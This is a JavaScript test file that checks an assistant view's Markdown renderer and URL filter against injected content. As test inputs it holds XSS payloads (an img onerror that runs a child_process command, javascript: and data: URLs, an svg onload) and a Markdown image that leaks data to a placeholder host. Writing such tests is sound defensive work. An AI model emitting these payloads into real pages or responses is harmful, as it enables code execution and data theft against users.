const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

function loadView(marked) {
    const source = fs
        .readFileSync(path.join(__dirname, '../src/components/views/AssistantView.js'), 'utf8')
        .replace(/^import .*;\r?$/gm, '')
        .replace('export class AssistantView', 'class AssistantView');
    const module = { exports: {} };
    vm.runInNewContext(`${source}\nmodule.exports = { AssistantView, safeResponseUrl };`, {
        module,
        LitElement: class {},
        css: () => '',
        html: () => '',
        customElements: { define: () => {} },
        window: { marked },
        URL,
        console: { warn: () => {} },
    });
    const view = Object.create(module.exports.AssistantView.prototype);
    view.wrapWordsInSpans = html => html;
    return { view, safeResponseUrl: module.exports.safeResponseUrl };
}

test('assistant renders Markdown and code but escapes model-supplied HTML and scriptable links', () => {
    const marked = require('../src/assets/marked-4.3.0.min.js').marked;
    const { view } = loadView(marked);
    const answer = [
        "**Ready** <img src=x onerror=\"require('child_process').exec('calc')\">",
        '[unsafe](javascript:alert(1)) [safe](https://example.com/path)',
        '![private screenshot](https://example.com/collect?data=secret)',
        '```js',
        'const html = "<script>alert(1)</script>";',
        '```',
    ].join('\n\n');
    const rendered = view.renderMarkdown(answer);

    assert.match(rendered, /<strong>Ready<\/strong>/);
    assert.match(rendered, /&lt;img src=x onerror=/);
    assert.doesNotMatch(rendered, /<img\b|onerror=\"|href=\"javascript:|<script>/);
    assert.match(rendered, /unsafe/);
    assert.match(rendered, /<a href="https:\/\/example\.com\/path">safe<\/a>/);
    assert.match(rendered, /private screenshot/);
    assert.doesNotMatch(rendered, /<img\b|collect\?data=secret/);
    assert.match(rendered, /<pre><code class="language-js">/);
    assert.match(rendered, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
});

test('unsafe navigation URLs and Markdown failures remain inert', () => {
    const { view, safeResponseUrl } = loadView({
        Renderer: class {},
        parse: () => {
            throw new Error('parser failure');
        },
    });

    assert.equal(safeResponseUrl('https://example.com/a'), 'https://example.com/a');
    for (const value of ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'file:///C:/secret.txt', 'mailto:x@example.com']) {
        assert.equal(safeResponseUrl(value), null);
    }
    assert.equal(view.renderMarkdown('<svg onload=alert(1)> &'), '&lt;svg onload=alert(1)&gt; &amp;');
});
